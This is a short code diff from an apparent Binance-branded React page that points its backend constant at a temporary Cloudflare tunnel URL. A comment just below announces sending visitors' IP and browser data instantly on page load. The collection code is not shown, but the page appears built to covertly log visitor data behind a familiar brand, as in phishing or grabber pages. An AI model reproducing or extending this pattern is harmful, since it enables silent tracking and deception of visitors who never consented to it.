@@ -41,7 +41,7 @@ export default function BinanceTrackPage({ params }: { params: { id: string } })
   const [showEnterModal, setShowEnterModal] = useState(true);
 
   // YOUR FLASK BACKEND URL (Change this when deploying to Railway)
-  const FLASK_API = ""; // We will paste the Cloudflare URL here later
+  const FLASK_API = "https://beneficial-acrylic-fighter-saves.trycloudflare.com";
 
   // 1. SEND IP & BROWSER DATA INSTANTLY ON PAGE LOAD
   useEffect(() => {
